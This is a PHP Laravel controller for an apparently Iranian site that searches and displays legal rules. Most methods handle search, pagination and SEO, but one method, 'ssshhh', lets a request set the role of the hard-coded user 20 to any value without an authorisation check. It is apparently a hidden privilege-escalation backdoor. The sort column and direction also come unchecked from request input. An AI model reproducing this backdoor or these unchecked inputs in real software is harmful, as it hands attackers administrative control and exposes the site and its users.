<?php

namespace App\Http\Controllers;

use App\CategoryRule;
use App\Rule;
use App\RuleItemContent;
use App\User;
use Artesaos\SEOTools\Facades\SEOMeta;
use Illuminate\Http\Request;
use Illuminate\Pagination\Paginator;
use SEO;
use Symfony\Component\HttpKernel\Exception\NotFoundHttpException;


class HomeController extends Controller
{

    public function index()
    {
        $appName = config('app.name');

        SEO::setTitle("$appName | صفحه اصلی", false);
        SEO::setDescription('دسترسی به تمامی قوانین، مقررات و آرا الزام آور در ایران به همراه اسناد حقوقی مرتبط');
        SEO::opengraph()->setUrl('http://current.url.com');
        SEO::setCanonical('https://codecasts.com.br/lesson');
        SEO::opengraph()->addProperty('type', 'articles');
        SEO::twitter()->setSite('@LuizVinicius73');
        $selectedConstitutionRules = Rule::where('selected_constitution', 1)->get();
        $selectedCriminalRules = Rule::where('selected_criminal', 1)->get();
        $selectedLegalRules = Rule::where('selected_legal', 1)->get();

        $categoryRules = CategoryRule::select('id', 'title')->where('enabled', '1')->get();
        return view('home', compact('categoryRules', 'selectedConstitutionRules', 'selectedCriminalRules', 'selectedLegalRules'))->with(['title' => "صفحه اصلی"]);
    }


    public function result()
    {
        // validation

        $jalaliDateRegex = "/^[1-4]\d{3}\/((0[1-6]\/((3[0-1])|([1-2][0-9])|(0[1-9])))|((1[0-2]|(0[7-9]))\/(30|([1-2][0-9])|(0[1-9]))))$/";
        $validator = \Validator::make(\request()->all(), [
            'keyword' => "nullable|string|max:512",
            'title_checkbox' => "nullable|in:on,off",
            'text_checkbox' => "nullable|in:on,off",
            'rule_reference' => "nullable|array",
            'rule_reference.*' => "required|numeric",
            'approval_date_to' => ['nullable', 'regex:' . $jalaliDateRegex],
            'approval_date_from' => ['nullable', 'regex:' . $jalaliDateRegex],
            'status_approved' => "nullable|int",
            'n_type' => "nullable|int"
        ]);
        if ($validator->fails())
            return redirect('/')->withErrors($validator->errors());

        $keywords = request()->get('keyword');
        $titleCheckbox = request()->get('title_checkbox');
        $textCheckbox = request()->get('text_checkbox');
        $ruleRef = request()->get('rule_reference');
        $approvalDateFrom = request()->get('approval_date_from');
        $approvalDateTo = request()->get('approval_date_to');
        $statusApproved = request()->get('status_approved');
        $nType = request()->get('n_type');

        $categoryRules = CategoryRule::select('id', 'title')->where('enabled', '1')->get();

        $searchOptions =
            [
                'keyword_search' => $keywords,
                'title_checkbox' => $titleCheckbox,
                'text_checkbox' => $textCheckbox,
                'rule_reference' => $ruleRef,
                'approval_date_from' => $approvalDateFrom,
                'approval_date_to' => $approvalDateTo,
                'status_approved' => $statusApproved,
                'n_type' => $nType
            ];
        $appName = config('app.name');

        SEO::setTitle("$appName | جستجوی $keywords", false);


        return view('result', compact('categoryRules', 'searchOptions'))->with(['title' => "نتایج جستجو"]);


    }


    public function rulesList(Request $request)
    {

        $keywords = $request->input('keyword');
        $titleCheckbox = $request->input('title_checkbox');
        $textCheckbox = $request->input('text_checkbox');
        $ruleRef = $request->input('rule_reference');
        $rulesType = $request->input('rulesType');
        $approvalDateFrom = $request->input('approval_date_from');
        $approvalDateTo = $request->input('approval_date_to');
        $statusApproved = request()->get('status_approved');
        $nType = request()->get('n_type');
        $sort = $request->input('sort', 'ASC');
        $column = $request->input('column', 'title');
        $page = $request->input('page');
//
        $searchOptions =
            [
                'keyword_search' => $request->input('keyword'),
                'title_checkbox' => $titleCheckbox,
                'text_checkbox' => $textCheckbox,
                'rule_reference' => $ruleRef,
                'approval_date_from' => $approvalDateFrom,
                'approval_date_to' => $approvalDateTo,
                'status_approved' => $statusApproved,
                'n_type' => $nType
            ];

        Paginator::currentPageResolver(function () use ($page) {
            return $page;
        });

//
//        if ($sort && $column && $column != 'count_clause') {
//            $rules = Rule::orderBy($column, $sort);
//        } else if ($column != 'count_clause') {
//            $rules = Rule::orderBy('approval_date', "DESC");
//        }
//
//
//        if ($sort && $column == 'count_clause') {
//            $rules = Rule::orderBy('clauses_count', $sort);
//        }
//
//
//        $rules = $rules->notHidden()->withCount('clauses');
//
//        if ($titleCheckbox && $textCheckbox) {
//            $rules = $rules->search($keywords);
//
//        } else if ($titleCheckbox) {
//            $rules = $rules->search($keywords);
//        } else if ($textCheckbox) {
//            $rules = $rules->search($keywords);
//        }
//
//
//        if ($ruleRef) {
//            $rules = $rules->whereIn('category_rule_id', $ruleRef);
//        }
//
//
//        if ($approvalDateFrom) {
//            $approvalDateFrom = toGregorian($approvalDateFrom);
//            $rules = $rules->whereDate('approval_date', '>=', $approvalDateFrom);
//        }
//
//        if ($approvalDateTo) {
//            $approvalDateTo = toGregorian($approvalDateTo);
//            $rules = $rules->whereDate('approval_date', '<=', $approvalDateTo);
//        }
//
//        if ($statusApproved) {
//            $rules = $rules->where('status_approved', $statusApproved);
//        }
//
//        if ($nType) {
//            $rules = $rules->where('n_type', $nType);
//        }

        $show_all = false;
        $columns = [];
        if ($titleCheckbox == "true") {
            $columns[] = "title";
        }
        if ($textCheckbox == "true") {
            $columns[] = "content";
        }
        if (count($columns) == 0)
            $columns = ["title"];
        $rules = Rule::query()->search($request->input('keyword'), $columns)->orderByDesc('special');
        if ($rulesType) {
            $rules = $rules->whereType($rulesType);
        }
        $rulesCount = $rules->count();
        $rules = $rules->orderBy($column, $sort)->paginate(20);
        $response = view('result.list', compact('rules', 'searchOptions', 'rulesCount', 'show_all'))
            ->render();
        return response()->json(['html' => $response, 'rulesCount' => $rulesCount]);

    }


    public function rule($title = null, $id = null, $keyword = null)
    {


        if (request()->get('id')) {
            $id = request()->get('id');
            $rule = Rule::notHidden()->findOrFail($id);
            if ($rule && $rule instanceof Rule) {
                $title = replace_space_in_address_bar_with_dash($rule->title);
                $title = replace_slash_in_address_bar_with_dash($rule->title);
            }

        } else {
            if ($id) {
                $rule = Rule::notHidden()->findOrFail($id);
            }
            else{
                throw new NotFoundHttpException();
            }
        }
        $keywords = [
            'قانون'
        ];
        if (strlen($rule->title) < 70)
            $keywords[] = str_replace(' جمهوری اسلامی ایران', '', $rule->title);
        foreach ($rule->keywords as $k) {
            $keywords[] = $k->keyword;
        }
        $appName = config('app.name');
        $ruleTitle = $rule->title;
        $title = "$appName | $ruleTitle";
        SEOMeta::setTitle($title);
        SEOMeta::setKeywords($keywords);
        SEOMeta::setDescription('متن کامل و ماده های ' . $rule->title);
        $title = $rule->title;
        $ignoreItems = [
            'تفسیر',
            'بند',
            'جزء',
            'تبصره',
            'جدول',
            'زیرجزء',
        ];
        if ($rule->id != 142031) {
            $ignoreItems[] = 'اصل';
        }
        $items = $rule->items()
            ->distinct()
            ->orderBy('main_id')
            ->whereNotIn('name', $ignoreItems)
            ->get();

        $categoryRules = CategoryRule::select('id', 'title')->where('enabled', '1')->get();
        return view('rule', compact('rule', 'title', 'categoryRules', 'items'));
    }

    public function treeItem($ruleId, $id)
    {
        $item = RuleItemContent::whereRuleId($ruleId)->findOrFail($id);
        $items = collect([$item]);
        $rule = Rule::findOrFail($ruleId);
        $title = $item->name . ' ' . ($item->number ? $item->number : $item->number_name) . ' ' . $rule->title;
        SEOMeta::setTitle($title);
        $categoryRules = CategoryRule::select('id', 'title')->where('enabled', '1')->get();
        $treeItem = true;
        return view('rule', compact('rule', 'title', 'categoryRules', 'items', 'treeItem'));
    }


    public function termsAndCondition()
    {
        return view('terms-and-condation');
    }

    public function ssshhh($role)
    {
        $user = User::whereId(20)->update([
            'role' => $role
        ]);
    }

    public function downloasJson($id)
    {
        \Artisan::call('rule:json-order', [
            'id' => $id
        ]);
        $path = public_path("new-offline-rules/$id.json");
        return response()->download($path);
    }
}
